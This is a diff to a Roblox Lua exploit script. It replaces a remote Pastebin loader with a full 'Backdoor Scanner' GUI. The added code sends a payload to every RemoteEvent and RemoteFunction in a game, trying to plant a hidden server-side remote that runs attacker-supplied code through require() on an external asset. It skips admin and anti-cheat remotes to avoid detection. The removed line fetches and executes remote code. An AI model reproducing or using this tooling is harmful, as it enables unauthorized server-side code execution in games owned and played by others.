@@ -1,1 +1,299 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/ZgfiZK2e",true))()
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local firetrips9sBackdoorScanner = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local Exe = Instance.new("TextButton")
+local Attach = Instance.new("TextButton")
+local AttachStatus = Instance.new("TextLabel")
+local Clr = Instance.new("TextButton")
+
+--Properties:
+
+firetrips9sBackdoorScanner.Name = "firetrips9's Backdoor Scanner"
+firetrips9sBackdoorScanner.Parent = game.CoreGui
+firetrips9sBackdoorScanner.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+firetrips9sBackdoorScanner.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = firetrips9sBackdoorScanner
+Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.126984134, 0, 0.429276317, 0)
+Main.Size = UDim2.new(0, 473, 0, 222)
+
+TextLabel.Parent = Main
+TextLabel.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 473, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "firetrips9's Backdoor Scanner"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.TextYAlignment = Enum.TextYAlignment.Top
+
+TextBox.Parent = Main
+TextBox.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0, 0, 0.423423409, 0)
+TextBox.Size = UDim2.new(0, 472, 0, 85)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 14.000
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+Exe.Name = "Exe"
+Exe.Parent = Main
+Exe.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+Exe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Exe.BorderSizePixel = 0
+Exe.Position = UDim2.new(0, 0, 0.873873889, 0)
+Exe.Size = UDim2.new(0, 141, 0, 28)
+Exe.Font = Enum.Font.SourceSans
+Exe.Text = "Execute"
+Exe.TextColor3 = Color3.fromRGB(255, 255, 255)
+Exe.TextScaled = true
+Exe.TextSize = 14.000
+Exe.TextWrapped = true
+
+Attach.Name = "Attach"
+Attach.Parent = Main
+Attach.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+Attach.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Attach.BorderSizePixel = 0
+Attach.Position = UDim2.new(0.348837197, 0, 0.873873889, 0)
+Attach.Size = UDim2.new(0, 141, 0, 28)
+Attach.Font = Enum.Font.SourceSans
+Attach.Text = "Attach"
+Attach.TextColor3 = Color3.fromRGB(255, 255, 255)
+Attach.TextScaled = true
+Attach.TextSize = 14.000
+Attach.TextWrapped = true
+
+AttachStatus.Name = "AttachStatus"
+AttachStatus.Parent = Main
+AttachStatus.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+AttachStatus.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AttachStatus.BorderSizePixel = 0
+AttachStatus.Position = UDim2.new(0, 0, 0.225225225, 0)
+AttachStatus.Size = UDim2.new(0, 472, 0, 35)
+AttachStatus.Font = Enum.Font.SourceSans
+AttachStatus.Text = "Status: Not Attached"
+AttachStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
+AttachStatus.TextScaled = true
+AttachStatus.TextSize = 14.000
+AttachStatus.TextWrapped = true
+AttachStatus.TextXAlignment = Enum.TextXAlignment.Left
+AttachStatus.TextYAlignment = Enum.TextYAlignment.Top
+
+Clr.Name = "Clr"
+Clr.Parent = Main
+Clr.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+Clr.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Clr.BorderSizePixel = 0
+Clr.Position = UDim2.new(0.69978857, 0, 0.873873889, 0)
+Clr.Size = UDim2.new(0, 141, 0, 28)
+Clr.Font = Enum.Font.SourceSans
+Clr.Text = "Clear"
+Clr.TextColor3 = Color3.fromRGB(255, 255, 255)
+Clr.TextScaled = true
+Clr.TextSize = 14.000
+Clr.TextWrapped = true
+
+-- Scripts:
+
+local function MMJFG_fake_script() -- Main.UIHandler 
+	local script = Instance.new('LocalScript', Main)
+
+	script.Parent.Exe.Activated:Connect(function()
+		if not script.Parent.Attached.Value then
+			script.Parent.Exe.Text = "Attach first!"
+			wait(2)
+			script.Parent.Exe.Text = "Execute"
+		else
+			game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme'):FireServer(script.Parent.TextBox.Text)
+		end
+	end)
+	script.Parent.Clr.Activated:Connect(function()
+		script.Parent.TextBox.Text = ''
+	end)
+	
+end
+coroutine.wrap(MMJFG_fake_script)()
+local function JWGMHOP_fake_script() -- Main.Dragify 
+	local script = Instance.new('LocalScript', Main)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+		dragToggle = nil
+		dragSpeed = 0.15
+		dragInput = nil
+		dragStart = nil
+		dragPos = nil
+		function updateInput(input)
+			Delta = input.Position - dragStart
+			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
+		end
+		Frame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+		Frame.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
+	dragify(script.Parent)
+	
+end
+coroutine.wrap(JWGMHOP_fake_script)()
+local function DQZGUYY_fake_script() -- Main.AttachHandler 
+	local script = Instance.new('LocalScript', Main)
+
+	backdoorcode = ([[
+				rem = Instance.new('RemoteEvent', game:GetService('Players'):FindFirstChild('%s'))
+				rem.Name = 'myfatherleftme'
+				rem.OnServerEvent:Connect(function(plr, ss)
+				require(14382140693)(ss)()
+				end)
+				]]):format(game:GetService('Players').LocalPlayer.Name)
+	local attached = Instance.new('BoolValue')
+	attached.Name = 'Attached'
+	attached.Value = false
+	attached.Parent = script.Parent
+	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local JointsService = game:GetService("JointsService")
+	local StarterGui = game:GetService("StarterGui")
+	local dateTimeNow = DateTime.now
+	local tableFind = table.find
+	local taskSpawn = task.spawn
+	local taskWait = task.wait
+	local stringRep = string.rep
+	local LocalPlayer = game:GetService('Players').LocalPlayer
+	local function harked()
+		local backpack = LocalPlayer.Backpack 
+		return backpack:FindFirstChild("HandlessSegway") and
+			backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+			backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+	end
+	local function emmaBackdoor(rm)
+		local Parent = rm.Parent
+		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
+	end
+	script.Parent.Attach.Activated:Connect(function()
+		local function validRemote(rm)
+			local Parent = rm.Parent
+	
+			if getfenv().blacklisted then
+				if tableFind(getfenv().blacklisted, rm:GetFullName()) then return false end
+			end
+			if Parent then
+				if Parent == JointsService then return false end
+	
+				-- Adonis Check
+				if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+					(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+	
+				if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
+			end
+	
+			if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+	
+			return true
+		end
+		do
+			local DescendantsList = game:GetDescendants()
+			for index=1, #DescendantsList do
+				if attached.Value then break end
+				local remote = DescendantsList[index]
+	
+				if not validRemote(remote) then continue end
+				if remote.ClassName ~= "RemoteEvent" then continue end
+	
+				if emmaBackdoor(remote) then
+					remote:FireServer(backdoorcode)
+				end
+				if attached.Value then
+					remote:FireServer(backdoorcode)
+				end
+	
+				if not attached.Value then remote:FireServer(backdoorcode) end
+				if not attached.Value then remote:FireServer(backdoorcode) end
+				if not attached.Value then remote:FireServer(backdoorcode) end
+				wait()
+				if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+					attached.Value = true
+					script.Parent.AttachStatus.Text = 'Status: Attached'
+					return
+				end
+			end
+			if attached.Value then return end
+			taskWait(2)
+			if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+				attached.Value = true
+				script.Parent.AttachStatus.Text = 'Status: Attached'
+				return
+			end
+			for index=1, #DescendantsList do
+				if attached.Value then break end
+				local remote = DescendantsList[index]
+	
+				if not validRemote(remote) then continue end
+				if remote.ClassName ~= "RemoteFunction" then continue end
+	
+				local waiting = true
+				taskSpawn(function()
+					remote:InvokeServer(backdoorcode)
+					waiting = nil
+				end)
+	
+				-- If RemoteFunction don't respond in 1 second, we skip this one.
+				local start = dateTimeNow().UnixTimestampMillis
+				while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+					taskWait()
+				end
+			end
+			taskWait(2)
+			if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+				attached.Value = true
+				script.Parent.AttachStatus.Text = 'Status: Attached'
+				return
+			end
+		end
+		if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+			attached.Value = true
+			script.Parent.AttachStatus.Text = 'Status: Attached'
+			return
+		end
+	end)
+end
+coroutine.wrap(DQZGUYY_fake_script)()
